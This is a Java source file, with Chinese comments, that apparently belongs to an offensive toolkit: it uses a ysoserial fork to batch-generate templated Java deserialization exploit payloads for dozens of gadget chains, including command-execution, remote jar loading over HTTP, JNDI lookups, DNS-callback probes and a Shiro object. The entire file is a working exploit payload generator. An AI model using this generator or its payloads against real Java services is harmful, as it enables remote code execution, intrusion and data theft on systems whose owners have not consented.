import me.gv7.woodpecker.yso.payloads.*;
import org.apache.shiro.subject.SimplePrincipalCollection;
import javassist.ClassPool;

import java.io.*;
import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Start {
    private static final String TEMPLATE_CLASS = "template";
    private static final String TRANSFORM_CLASS = "transform";
    
    // 固定的 Gadget 类列表
    private static final String[] GADGET_CLASSES = {
        "AspectJWeaver", "BeanShell1", "C3P0", "C3P0_LowVer", "Click1", "Clojure",
        "CommonsBeanutils1", "CommonsBeanutils1_183", "CommonsBeanutils2", "CommonsBeanutils2_183",
        "CommonsBeanutils3", "CommonsBeanutils3_183",
        "CommonsCollections1", "CommonsCollections10", "CommonsCollections11", 
        "CommonsCollections2", "CommonsCollections3", "CommonsCollections4",
        "CommonsCollections5", "CommonsCollections6", "CommonsCollections6Lite",
        "CommonsCollections7", "CommonsCollections8", "CommonsCollections9",
        "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsCollectionsK3", "CommonsCollectionsK4",
        "FileUpload1", "FindClassByBomb", "FindClassByDNS", "FindGadgetByDNS",
        "Groovy1", "Hibernate1", "Hibernate2",
        "JBossInterceptors1", "JRMPClient", "JRMPClient2", "JRMPListener",
        "JSON1", "JavassistWeld1", "Jdk7u21", "Jdk8u20", "Jython1",
        "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Myfaces2",
        "ROME", "Spring1", "Spring2", "Spring3",
        "URLDNS", "Vaadin1", "Wicket1"
    };
    
    // 从 config.yaml 解析的 template 类型 gadget
    private static Set<String> templateGadgets = new HashSet<>();
    // 从 config.yaml 解析的 ref-fun 类型 gadget
    private static Map<String, String> refFunGadgets = new HashMap<>();
    
    public static void main(String[] args) throws Exception {
        // 初始化 Javassist ClassPool (解决 Java 9+ 下找不到 java.io.Serializable 的问题)
        initJavassistClassPool();
        
        // 解析参数
        String configPath = "../static/config.yaml";
        String outputDir = "../static/gadgets";
        
        for (int i = 0; i < args.length; i++) {
            if (args[i].equals("--config") && i + 1 < args.length) {
                configPath = args[++i];
            } else if (args[i].equals("--output") && i + 1 < args.length) {
                outputDir = args[++i];
            }
        }
        
        // 确保输出目录存在
        Path outputPath = Paths.get(outputDir);
        if (!Files.exists(outputPath)) {
            Files.createDirectories(outputPath);
        }
        
        // 解析 config.yaml
        parseConfigYaml(configPath);
        
        System.out.println("Template Gadgets: " + templateGadgets);
        System.out.println("RefFun Gadgets: " + refFunGadgets);
        System.out.println();
        
        // 获取所有可用的 payload 类
        Map<String, Class<? extends ObjectPayload>> payloadClassMap = new HashMap<>();
        List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<>(ObjectPayload.Utils.getPayloadClasses());
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            payloadClassMap.put(payloadClass.getSimpleName(), payloadClass);
        }
        
        // 分类 gadget
        Map<String, List<String>> typeMap = new HashMap<>();
        typeMap.put(TEMPLATE_CLASS, new ArrayList<>());
        typeMap.put(TRANSFORM_CLASS, new ArrayList<>());
        
        for (String gadgetName : GADGET_CLASSES) {
            if (!payloadClassMap.containsKey(gadgetName)) {
                System.out.println("警告: 未找到 payload 类: " + gadgetName);
                continue;
            }
            
            // 跳过特殊的 ref-fun 类型
            if (refFunGadgets.containsKey(gadgetName)) {
                continue;
            }
            
            if (templateGadgets.contains(gadgetName)) {
                typeMap.get(TEMPLATE_CLASS).add(gadgetName);
            } else {
                typeMap.get(TRANSFORM_CLASS).add(gadgetName);
            }
        }
        
        System.out.println("Template 类型数量: " + typeMap.get(TEMPLATE_CLASS).size());
        System.out.println("Transform 类型数量: " + typeMap.get(TRANSFORM_CLASS).size());
        System.out.println();
        
        // 生成序列化文件
        OutputStream out;
        
        // 1. 处理特殊的 jndi 类型 gadget (CommonsBeanutils3)
        if (payloadClassMap.containsKey("CommonsBeanutils3")) {
            try {
                out = Files.newOutputStream(Paths.get(outputDir, "CommonsBeanutils3.ser"));
                serialize(new CommonsBeanutils3().getObject("jndi:{{param0}}"), out);
                System.out.println("生成: CommonsBeanutils3.ser");
            } catch (Exception e) {
                System.err.println("生成 CommonsBeanutils3 失败: " + e.getMessage());
            }
        }
        
        // 1.1 处理 CommonsBeanutils3_183 (jndi 专用)
        // if (payloadClassMap.containsKey("CommonsBeanutils3_183")) {
        //     try {
        //         out = Files.newOutputStream(Paths.get(outputDir, "CommonsBeanutils3_183.ser"));
        //         serialize(payloadClassMap.get("CommonsBeanutils3_183").newInstance().getObject("jndi:{{param0}}"), out);
        //         System.out.println("生成: CommonsBeanutils3_183.ser");
        //     } catch (Exception e) {
        //         System.err.println("生成 CommonsBeanutils3_183 失败: " + e.getMessage());
        //     }
        // }
        
        // 2. 处理 FindClassByBomb
        if (payloadClassMap.containsKey("FindClassByBomb")) {
            out = Files.newOutputStream(Paths.get(outputDir, "FindClassByBomb.ser"));
            serialize(new FindClassByBomb().getObject("{{param0}}|28"), out);
            System.out.println("生成: FindClassByBomb.ser");
        }
        
        // 3. 处理 FindClassByDNS
        if (payloadClassMap.containsKey("FindClassByDNS")) {
            out = Files.newOutputStream(Paths.get(outputDir, "FindClassByDNS.ser"));
            serialize(new FindClassByDNS().getObject("http://{{param0}}|{{param1}}"), out);
            System.out.println("生成: FindClassByDNS.ser");
        }
        
        // 4. 处理 AspectJWeaver (特殊格式: <filename>;<base64 Object>，用分号分隔)
        if (payloadClassMap.containsKey("AspectJWeaver")) {
            try {
                out = Files.newOutputStream(Paths.get(outputDir, "AspectJWeaver.ser"));
                // 参数格式: filename;base64Object (用分号分隔)
                serialize(new AspectJWeaver().getObject("{{param0}};{{param1}}"), out);
                System.out.println("生成: AspectJWeaver.ser");
            } catch (Exception e) {
                System.err.println("生成 AspectJWeaver 失败: " + e.getMessage());
            }
        }
        
        // 6. 处理 template 类型
        for (String gadgetName : typeMap.get(TEMPLATE_CLASS)) {
            try {
                Class<? extends ObjectPayload> payloadClass = payloadClassMap.get(gadgetName);
                String fileName = TEMPLATE_CLASS + "_" + gadgetName + ".ser";
                out = Files.newOutputStream(Paths.get(outputDir, fileName));
                Object payloadObj = payloadClass.newInstance().getObject("class_base64:");
                
                if (gadgetName.equals("Jdk8u20")) {
                    out.write((byte[]) payloadObj);
                } else {
                    serialize(payloadObj, out);
                }
                System.out.println("生成: " + fileName);
            } catch (Exception e) {
                e.printStackTrace();
                System.err.println("生成失败 " + gadgetName + ": " + e.getMessage());
            }
        }
        
        // 7. 处理 transform 类型
        String[] transformParams = {"dnslog", "httplog", "raw_cmd", "win_cmd", "linux_cmd", 
                                    "bcel", "bcel_with_args", "script_base64", "loadjar", 
                                    "loadjar_with_args", "jndi", "mozilla_defining_class_loader"};
        
        // 不支持标准 transform 参数的 gadget 列表
        Set<String> skipTransformGadgets = new HashSet<>(Arrays.asList(
            "AspectJWeaver",         // 需要 filename;base64 格式
            "CommonsBeanutils3_183", // JNDI 专用，单独处理
            "FileUpload1",           // 不支持标准命令
            "JRMPClient",            // 需要 host:port 格式
            "JRMPClient2",           // 需要 host:port 格式
            "JRMPListener",          // 需要端口号
            "Jython1",               // 不支持标准命令
            "Spring3",               // JNDI 专用
            "Wicket1",               // 需要特殊格式
            "FindGadgetByDNS"        // 需要特殊格式
        ));
        
        for (String gadgetName : typeMap.get(TRANSFORM_CLASS)) {
            // 跳过不支持标准参数的 gadget
            if (skipTransformGadgets.contains(gadgetName)) continue;
            
            Class<? extends ObjectPayload> payloadClass = payloadClassMap.get(gadgetName);
            
            for (String param : transformParams) {
                try {
                    // 跳过不支持的组合
                    if (param.equals("bcel_with_args") && gadgetName.equals("BeanShell1")) continue;
                    if (param.equals("loadjar_with_args") && gadgetName.equals("BeanShell1")) continue;
                    if (param.equals("mozilla_defining_class_loader") && gadgetName.equals("BeanShell1")) continue;
                    if (!param.equals("raw_cmd") && gadgetName.equals("Groovy1")) continue;
                    if (param.equals("script_base64") && gadgetName.equals("BeanShell1")) continue;
                    
                    // 只有 CommonsCollections6 支持 defining_class_loader
                    if (param.equals("mozilla_defining_class_loader") && !gadgetName.equals("CommonsCollections6")) continue;
                    
                    String outName = TRANSFORM_CLASS + "_" + param + "_" + gadgetName;
                    if (param.equals("script_base64")) {
                        outName = TRANSFORM_CLASS + "_script_" + gadgetName;
                    }
                    
                    String paramStr = buildParamString(param);
                    
                    out = Files.newOutputStream(Paths.get(outputDir, outName + ".ser"));
                    serialize(payloadClass.newInstance().getObject(param + ":" + paramStr), out);
                    System.out.println("生成: " + outName + ".ser");
                } catch (Exception e) {
                    System.err.println("生成失败 " + gadgetName + " (" + param + "): " + e.getMessage());
                }
            }
        }
        
        // 8. 处理 FindAllClassesByDNS
        try {
            out = Files.newOutputStream(Paths.get(outputDir, "FindAllClassesByDNS.ser"));
            FindGadgetByDNS findGadgetByDNS = new FindGadgetByDNS("{{param0}}");
            List<Object> gadgetList = findGadgetByDNS.genClassList();
            serialize((Serializable) gadgetList, out);
            System.out.println("生成: FindAllClassesByDNS.ser");
        } catch (Exception e) {
            System.err.println("生成 FindAllClassesByDNS 失败: " + e.getMessage());
        }
        
        // 9. 处理 URLDNS
        try {
            out = Files.newOutputStream(Paths.get(outputDir, "URLDNS.ser"));
            serialize(new URLDNS().getObject("http://{{param0}}"), out);
            System.out.println("生成: URLDNS.ser");
        } catch (Exception e) {
            System.err.println("生成 URLDNS 失败: " + e.getMessage());
        }
        
        // 10. 处理 SimplePrincipalCollection (Shiro)
        try {
            out = Files.newOutputStream(Paths.get(outputDir, "SimplePrincipalCollection.ser"));
            serialize(new SimplePrincipalCollection(), out);
            System.out.println("生成: SimplePrincipalCollection.ser");
        } catch (Exception e) {
            System.err.println("生成 SimplePrincipalCollection 失败: " + e.getMessage());
        }
        
        System.out.println();
        System.out.println("完成!");
    }
    
    /**
     * 解析 config.yaml 文件
     */
    private static void parseConfigYaml(String configPath) throws IOException {
        Path path = Paths.get(configPath);
        if (!Files.exists(path)) {
            System.out.println("警告: 配置文件不存在: " + configPath + ", 使用默认配置");
            // 使用默认的 template gadgets
            templateGadgets.addAll(Arrays.asList(
                "Vaadin1", "Spring2", "Spring1", "ROME", "MozillaRhino2", "MozillaRhino1",
                "JSON1", "Jdk8u20", "Jdk7u21", "JavassistWeld1", "JBossInterceptors1",
                "Hibernate1", "Click1", "CommonsBeanutils1", "CommonsBeanutils1_183",
                "CommonsBeanutils2", "CommonsBeanutils2_183", "CommonsCollections2",
                "CommonsCollections3", "CommonsCollections4", "CommonsCollections8",
                "CommonsCollections10", "CommonsCollections11", "CommonsCollectionsK1",
                "CommonsCollectionsK2"
            ));
            refFunGadgets.put("CommonsBeanutils3", "jndi");
            refFunGadgets.put("FindClassByBomb", "class");
            refFunGadgets.put("FindClassByDNS", "class-dnslog");
            refFunGadgets.put("FindAllClassesByDNS", "dnslog");
            refFunGadgets.put("URLDNS", "dnslog");
            return;
        }
        
        List<String> lines = Files.readAllLines(path);
        boolean inGadgetsSection = false;
        String currentGadget = null;
        
        Pattern gadgetPattern = Pattern.compile("^  (\\w+):.*");
        Pattern templatePattern = Pattern.compile("^\\s+template:\\s*true\\s*$");
        Pattern refFunPattern = Pattern.compile("^\\s+ref-fun:\\s*(\\S+)\\s*$");
        
        for (String line : lines) {
            // 检测 Gadgets 部分开始
            if (line.equals("Gadgets:")) {
                inGadgetsSection = true;
                continue;
            }
            
            // 检测其他顶级部分（退出 Gadgets）
            if (inGadgetsSection && !line.startsWith(" ") && !line.isEmpty() && !line.startsWith("#")) {
                inGadgetsSection = false;
                currentGadget = null;
            }
            
            if (!inGadgetsSection) continue;
            
            // 解析 gadget 名称
            Matcher gadgetMatcher = gadgetPattern.matcher(line);
            if (gadgetMatcher.matches()) {
                currentGadget = gadgetMatcher.group(1);
                continue;
            }
            
            if (currentGadget == null) continue;
            
            // 解析 template: true
            if (templatePattern.matcher(line).matches()) {
                templateGadgets.add(currentGadget);
            }
            
            // 解析 ref-fun
            Matcher refFunMatcher = refFunPattern.matcher(line);
            if (refFunMatcher.matches()) {
                refFunGadgets.put(currentGadget, refFunMatcher.group(1));
            }
        }
    }
    
    /**
     * 构建参数字符串
     */
    private static String buildParamString(String param) {
        switch (param) {
            case "loadjar_with_args":
                return "http://{{param0}}|{{param1}}|{{param2}}";
            case "loadjar":
                return "http://{{param0}}|{{param1}}";
            case "bcel_with_args":
                return "{{param0}}|{{param1}}";
            case "mozilla_defining_class_loader":
                return "{{param0}}|{{param1}}";
            case "script_base64":
                return "e3twYXJhbTB9fQ=="; // base64 of {{param0}}
            default:
                return "{{param0}}";
        }
    }
    
    /**
     * 序列化对象
     */
    public static void serialize(Object obj, OutputStream out) throws IOException {
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.close();
    }
    
    /**
     * 初始化 Javassist ClassPool
     * 解决 Java 9+ 模块系统下找不到 JDK 类的问题
     */
    private static void initJavassistClassPool() {
        try {
            ClassPool pool = ClassPool.getDefault();
            // 插入系统类路径
            pool.insertClassPath(new javassist.ClassClassPath(java.io.Serializable.class));
            pool.insertClassPath(new javassist.ClassClassPath(Object.class));
            pool.insertClassPath(new javassist.ClassClassPath(String.class));
            System.out.println("Javassist ClassPool 初始化完成");
        } catch (Exception e) {
            System.err.println("警告: Javassist ClassPool 初始化失败: " + e.getMessage());
        }
    }
}
